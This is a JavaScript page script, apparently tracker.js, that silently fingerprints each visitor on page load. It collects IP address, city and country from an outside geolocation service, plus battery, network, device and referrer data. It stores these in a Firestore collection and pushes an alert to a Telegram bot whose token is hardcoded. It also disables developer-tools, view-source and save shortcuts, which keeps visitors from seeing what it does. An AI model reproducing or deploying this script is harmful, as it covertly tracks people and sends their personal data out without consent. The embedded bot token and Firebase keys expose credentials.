const firebaseConfig = {
  apiKey: "AIzaSyBg-RCDEXF5rUvAjT7OQ5uNvswFTqzfGco",
  authDomain: "log-h-8891b.firebaseapp.com",
  projectId: "log-h-8891b",
  storageBucket: "log-h-8891b.firebasestorage.app",
  messagingSenderId: "215331553440",
  appId: "1:215331553440:web:2509a4bac55713eed609c5",
}; // tracker.js

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

async function collectAllUserInfo() {
  const ipInfo = await fetch("https://ipapi.co/json/")
    .then((res) => res.json())
    .catch(() => ({}));
  const battery =
    (await (navigator.getBattery
      ? navigator.getBattery()
      : Promise.resolve({}))) || {};
  const connection = navigator.connection || {};
  const now = new Date();

  const data = {
    timestamp: now.toISOString(),
    localTime: now.toString(),
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
    ip: ipInfo.ip || "N/A",
    city: ipInfo.city || "N/A",
    region: ipInfo.region || "N/A",
    country: ipInfo.country_name || "N/A",
    countryCode: ipInfo.country_code || "🌐",
    org: ipInfo.org || "N/A",
    userAgent: navigator.userAgent,
    platform: navigator.platform || "N/A",
    language: navigator.language || "N/A",
    memory: navigator.deviceMemory || "N/A",
    cpuCores: navigator.hardwareConcurrency || "N/A",
    touchSupport: "ontouchstart" in window,
    screen: {
      width: window.screen.width,
      height: window.screen.height,
      pixelRatio: window.devicePixelRatio,
    },
    battery: {
      charging: battery.charging,
      level: battery.level,
      chargingTime: battery.chargingTime,
      dischargingTime: battery.dischargingTime,
    },
    network: {
      type: connection.effectiveType || "N/A",
      downlink: connection.downlink || "N/A",
      rtt: connection.rtt || "N/A",
    },
    visibility: document.visibilityState,
    referrer: document.referrer || "N/A",
    page: window.location.href,
    path: window.location.pathname,
    firstVisit: !localStorage.getItem("visitedBefore"),
  };

  localStorage.setItem("visitedBefore", true);

  await db.collection("visitor_logs").add(data);
  console.log("welcome");

  return data;
}

function sendTelegramAlert(data) {
  const botToken = "7821594033:AAGPOfTe--wHX2mm3cX7u53J28PsmG1cEDU";
  const chatId = "7190292986";

  // Convert country code to regional flag emoji
  const flag = data.countryCode
    ? [...data.countryCode.toUpperCase()]
        .map((char) => String.fromCodePoint(127397 + char.charCodeAt()))
        .join("")
    : "🌍";

  const message = `
♥ *Love visitor!* 💕

🔗 *Page:* ${data.page}
🌍 *IP:* \`${data.ip}\`
${flag} *Location:* ${data.city}, ${data.country}
🔋 *Battery:* ${
    data.battery.level ? Math.round(data.battery.level * 100) + "%" : "N/A"
  } ${data.battery.charging ? "⚡" : "🔋"}
🌐 *Network:* ${data.network.type || "N/A"}
📱 *Platform:* ${data.platform} 
🖥️ *Browser:* ${data.userAgent.split(") ")[0]} 
  `;

  const encodedMessage = encodeURIComponent(message);
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`;

  fetch(telegramUrl)
    .then((response) => {
      if (!response.ok) {
        console.error("Telegram Error:", response.statusText);
      }
    })
    .catch((err) => console.error("Telegram Fetch Failed:", err));
}

collectAllUserInfo().then((data) => {
  sendTelegramAlert(data);
});

document.addEventListener("keydown", function (e) {
  // F12
  if (e.key === "F12") {
    e.preventDefault();
  }

  // Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+Shift+C
  if (
    e.ctrlKey &&
    e.shiftKey &&
    ["I", "J", "C"].includes(e.key.toUpperCase())
  ) {
    e.preventDefault();
  }

  // Ctrl+U
  if (e.ctrlKey && e.key.toUpperCase() === "U") {
    e.preventDefault();
  }

  // Ctrl+S or Cmd+S
  if ((e.ctrlKey || e.metaKey) && e.key.toUpperCase() === "S") {
    e.preventDefault();
  }

  // Ctrl+Shift+K (Firefox DevTools)
  if (e.ctrlKey && e.shiftKey && e.key.toUpperCase() === "K") {
    e.preventDefault();
  }
});
